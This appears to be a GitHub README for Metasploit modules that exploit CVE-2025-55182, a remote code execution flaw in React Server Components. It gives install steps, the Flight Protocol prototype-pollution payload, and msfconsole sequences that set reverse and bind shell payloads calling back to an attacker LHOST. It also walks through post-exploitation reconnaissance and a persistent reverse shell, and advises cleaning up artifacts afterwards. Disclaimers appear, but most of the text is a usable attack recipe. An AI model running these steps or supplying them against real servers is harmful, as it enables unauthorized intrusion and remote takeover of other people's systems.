# React2Shell Metasploit Modules

Fully compliant Metasploit modules for exploiting the React2Shell vulnerability (CVE-2025-55182) in React Server Components. Developed following strict Metasploit Framework auditor rules to ensure upstream compatibility.

## 🎯 Key Features

### Included Modules
- **Scanner Module** (`auxiliary/scanner/http/react2shell.rb`) - Non-destructive vulnerability detection
- **Exploit Module** (`exploits/multi/http/react2shell_rce.rb`) - Exploitation using native Metasploit payloads

### Metasploit Compliance
- ✅ **Native Framework**: Uses exclusively Metasploit mixins and utilities
- ✅ **Separation of Concerns**: Scanner only detects, exploit only exploits
- ✅ **Payload System**: Uses `payload.encoded` from Metasploit's native system
- ✅ **Error Handling**: Robust handling with `fail_with()` and `Failure::*` codes
- ✅ **Upstream Ready**: Ready for contribution to Rapid7's official repository

## 📋 Requirements

- **Metasploit Framework** 6.0+
- **Ruby** 2.7+
- **Testing Gems**: `rspec`, `rspec-quickcheck` (for development)

## 🚀 Installation

### Metasploit Framework Installation

```bash
# 1. Clone the repository
git clone https://github.com/MoisesTapia/react2shell-metasploit.git
cd react2shell-metasploit

# 2. Copy modules to Metasploit
sudo cp modules/auxiliary/scanner/http/react2shell.rb \
  /usr/share/metasploit-framework/modules/auxiliary/scanner/http/

sudo cp modules/exploits/multi/http/react2shell_rce.rb \
  /usr/share/metasploit-framework/modules/exploits/multi/http/

# 3. Reload Metasploit
msfconsole -q -x "reload_all"
```

### Development Installation

```bash
# 1. Clone and setup
git clone https://github.com/MoisesTapia/react2shell-metasploit.git
cd react2shell-metasploit

# 2. Install dependencies
bundle install

# 3. Run tests
rspec spec/
```

## 📖 Module Usage

### Scanner Module - Vulnerability Detection

```bash
msf6 > use auxiliary/scanner/http/react2shell
msf6 auxiliary(scanner/http/react2shell) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/react2shell) > set TARGETURI /api/react
msf6 auxiliary(scanner/http/react2shell) > run
```

### Exploit Module - Exploitation with Native Payloads

```bash
# Basic configuration
msf6 > use exploit/multi/http/react2shell_rce
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS target.example.com
msf6 exploit(multi/http/react2shell_rce) > set TARGETURI /api/react

# Use native Metasploit payload
msf6 exploit(multi/http/react2shell_rce) > set payload cmd/unix/reverse_bash
msf6 exploit(multi/http/react2shell_rce) > set LHOST 192.168.1.50
msf6 exploit(multi/http/react2shell_rce) > set LPORT 4444

# Check vulnerability before exploiting
msf6 exploit(multi/http/react2shell_rce) > check

# Execute exploit
msf6 exploit(multi/http/react2shell_rce) > run
```

### Compatible Payloads

```bash
# Reverse shells
set payload cmd/unix/reverse_bash
set payload cmd/unix/reverse_netcat
set payload cmd/windows/reverse_powershell

# Bind shells  
set payload cmd/unix/bind_netcat
set payload cmd/windows/bind_powershell

# Command execution
set payload cmd/unix/generic
set payload cmd/windows/generic
```

## ⚙️ Configuration Options

### Scanner Module
- **RHOSTS**: Target host(s) to scan
- **RPORT**: Service port (default: 80/443)
- **SSL**: Use SSL/TLS (auto-detected)
- **TARGETURI**: React Server Components endpoint (default: /)

### Exploit Module
- **RHOSTS**: Target host(s) to exploit
- **RPORT**: Service port (default: 80/443)
- **SSL**: Use SSL/TLS (auto-detected)
- **TARGETURI**: Vulnerable endpoint (default: /)
- **Payload Options**: Specific configuration for selected payload

## 🏗️ Compliance Architecture

### Strict Separation of Responsibilities

```
┌─────────────────────────────────────────────────────────────┐
│                    Metasploit Framework                     │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────┐  ┌─────────────────────────────┐ │
│  │    Scanner Module       │  │     Exploit Module          │ │
│  │  (auxiliary/scanner)    │  │   (exploit/remote)          │ │
│  │                         │  │                             │ │
│  │ - Msf::Auxiliary        │  │ - Msf::Exploit::Remote      │ │
│  │ - Msf::Auxiliary::      │  │ - Msf::Exploit::Remote::    │ │
│  │   Scanner               │  │   HttpClient                │ │
│  │ - Msf::Exploit::Remote::│  │                             │ │
│  │   HttpClient            │  │ - Uses payload.encoded      │ │
│  │                         │  │ - ARCH_CMD compatible       │ │
│  │ - Non-destructive only  │  │ - Native Metasploit         │ │
│  │ - CheckCode reporting   │  │   payloads only             │ │
│  │ - report_vuln()         │  │                             │ │
│  └─────────────────────────┘  └─────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Key Components

#### Scanner Module
- **Non-Destructive Detection**: Only sends test payloads that don't execute commands
- **CheckCode Compliance**: Returns standard codes (Vulnerable, Appears, Safe, Unknown)
- **Standard Reporting**: Uses `report_vuln()` with all required parameters
- **Native HTTP**: Uses exclusively `send_request_cgi()` and `normalize_uri()`

#### Exploit Module  
- **Native Payload System**: Uses only `payload.encoded` from Metasploit
- **ARCH_CMD Support**: Compatible with all Metasploit command payloads
- **Robust Error Handling**: Uses `fail_with()` with appropriate `Failure::*` codes
- **Check Method**: Reuses scanner logic for pre-exploitation verification

## 🐛 Vulnerability Details

### CVE-2025-55182 - React2Shell
Vulnerability in React Server Components (RSC) that allows remote code execution through unsafe deserialization of the Flight Protocol.

**Affected Versions:**
- Next.js 14.3.x-canary
- Next.js 15.x  
- Next.js 16.x
- React Server Components with Flight Protocol

**Exploitation Technique:**
1. **Prototype Pollution**: Abuse of `_prefix` field in RSC chunks
2. **Function Constructor**: Transform `_formData.get` into `Function()` constructor
3. **Code Execution**: Execute arbitrary JavaScript on the server
4. **Payload Integration**: Use Metasploit's native payload system

### Flight Protocol Payload Structure

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model", 
  "reason": -1,
  "value": "{\"then\":\"$B0\"}",
  "_response": {
    "_prefix": "PAYLOAD_HERE",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

## 🛠️ Troubleshooting

### Common Scanner Issues

#### CheckCode::Unknown
- Verify connectivity to target
- Confirm TARGETURI points to correct endpoint
- Review logs with `set VERBOSE true`

#### Vulnerability Not Detected
- Verify target uses React Server Components
- Confirm vulnerable Next.js/React version
- Try different endpoints with TARGETURI

### Common Exploit Issues

#### Payload Not Available
```
[*] Exploit failed [bad-config]: No payload available
```
- Select compatible payload: `set payload cmd/unix/reverse_bash`
- Configure payload options: `set LHOST`, `set LPORT`

#### Connection Failed
```
[*] Exploit failed [unreachable]: Connection failed
```
- Verify network connectivity
- Confirm port is open
- Review proxy/SSL configuration

#### Unexpected Response
```
[*] Exploit failed [unexpected-reply]: Server responded with code 404
```
- Verify correct TARGETURI
- Confirm endpoint is vulnerable
- Run `check` before exploit

### Debug Mode

```bash
# Enable detailed output
set VERBOSE true

# Show all options
show options

# Show available payloads
show payloads
```

## 🧪 Testing and Development

### Run Test Suite

```bash
# Unit tests
rspec spec/ --format documentation

# Compliance tests
rspec spec/ --tag compliance

# Integration tests
rspec spec/ --tag integration
```

### Development Environment

```bash
# Setup environment
bundle install --path vendor/bundle

# Code linting
rubocop modules/ spec/

# Security analysis
semgrep --config=.semgrep.yml modules/

# Code smell detection
reek modules/
```

### Project Structure

```
react2shell-metasploit/
├── modules/
│   ├── auxiliary/scanner/http/
│   │   └── react2shell.rb           # Scanner module
│   └── exploits/multi/http/
│       └── react2shell_rce.rb       # Exploit module
├── spec/                            # Tests
├── .github/                         # CI/CD workflows
├── .rubocop.yml                     # Linting config
├── .semgrep.yml                     # Security scanning
├── .reek.yml                        # Code smell detection
├── Gemfile                          # Dependencies
└── README.md                        # This documentation
```

## 🔒 Security Considerations

### Ethical and Legal Use
- **Only use on owned systems** or with explicit written authorization
- **Follow responsible disclosure practices** for discovered vulnerabilities
- **Comply with local laws** and cybersecurity regulations
- **Document and report** usage in security audits

### Operational Security
- Use in laboratory environments for testing
- Monitor target logs for detection indicators
- Clean up artifacts after successful exploitation
- Maintain confidentiality of obtained data

## 📚 Advanced Examples

### System Reconnaissance

```bash
# Basic system information
msf6 exploit(multi/http/react2shell_rce) > set payload cmd/unix/generic
msf6 exploit(multi/http/react2shell_rce) > set CMD "uname -a && whoami && id"
msf6 exploit(multi/http/react2shell_rce) > run

# Running processes
msf6 exploit(multi/http/react2shell_rce) > set CMD "ps aux | head -20"
msf6 exploit(multi/http/react2shell_rce) > run

# Network connections
msf6 exploit(multi/http/react2shell_rce) > set CMD "netstat -tulpn"
msf6 exploit(multi/http/react2shell_rce) > run
```

### Persistent Reverse Shell

```bash
# Setup listener
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/reverse_bash
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run -j

# Execute exploit in another session
msf6 > use exploit/multi/http/react2shell_rce
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS target.example.com
msf6 exploit(multi/http/react2shell_rce) > set payload cmd/unix/reverse_bash
msf6 exploit(multi/http/react2shell_rce) > set LHOST 192.168.1.50
msf6 exploit(multi/http/react2shell_rce) > set LPORT 4444
msf6 exploit(multi/http/react2shell_rce) > run
```

## 🔧 Development and Contribution

### Compliance Rules

This project strictly follows **Metasploit Framework Guidelines**:

1. **No Custom Frameworks**: Only native Metasploit components
2. **Separation of Concerns**: Scanner detects, exploit exploits
3. **Native Payload System**: Exclusive use of `payload.encoded`
4. **Standard Error Handling**: `fail_with()` with appropriate codes
5. **Proper Reporting**: Standard `report_vuln()` and `store_loot()`

### Development Checklist

- [ ] Extend only approved Metasploit base classes
- [ ] Use native mixins (`Scanner`, `HttpClient`, etc.)
- [ ] Implement required methods (`run_host`, `check`, `exploit`)
- [ ] Use `send_request_cgi()` for HTTP operations
- [ ] Handle errors with specific Rex exceptions
- [ ] Report vulnerabilities with standard parameters
- [ ] Test with multiple Metasploit payloads
- [ ] Document compliance decisions

### Contributing to the Project

1. **Fork** the repository
2. **Create feature branch**: `git checkout -b feature/new-functionality`
3. **Follow** Metasploit compliance rules
4. **Add tests** for new functionality
5. **Commit** changes: `git commit -am 'Add new functionality'`
6. **Push** to branch: `git push origin feature/new-functionality`
7. **Create Pull Request** with detailed description

## 📖 References and Resources

### Official Documentation
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Rapid7 Module Guidelines](https://github.com/rapid7/metasploit-framework/wiki)
- [React Server Components](https://react.dev/reference/rsc/server-components)
- [Next.js Security](https://nextjs.org/docs/advanced-features/security-headers)

### Research and PoCs
- [CVE-2025-55182 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182)
- [Lachlan's Original PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [Assetnote Security Research](https://blog.assetnote.io/2025/01/09/react-server-components-rce/)

### Development Tools
- [RuboCop](https://rubocop.org/) - Ruby linting
- [Reek](https://github.com/troessner/reek) - Code smell detection
- [Semgrep](https://semgrep.dev/) - Static security analysis
- [RSpec](https://rspec.info/) - Testing framework

## 📄 License and Disclaimer

### License
This project is licensed under the **Metasploit Framework License (MSF_LICENSE)**.

### Legal Disclaimer
This software is provided "as is" without warranties of any kind. The authors are not responsible for misuse of this tool. **Using this software to attack systems without explicit authorization is illegal and strictly prohibited.**

### Responsible Use
- ✅ Authorized security audits
- ✅ Ethical security research
- ✅ Laboratory and testing environments
- ❌ Unauthorized attacks
- ❌ Malicious activities
- ❌ Terms of service violations

---

**Developed by**: Moises Tapia (Cl0wnr3v)  
**Specialization**: Cloud Security Architect, Cloud Penetration Tester & Red Teamer  
**Version**: 1.0.0  
**Last updated**: January 2025

**Project Status**: ✅ Metasploit Framework Compliant | ✅ Ready for Upstream Submission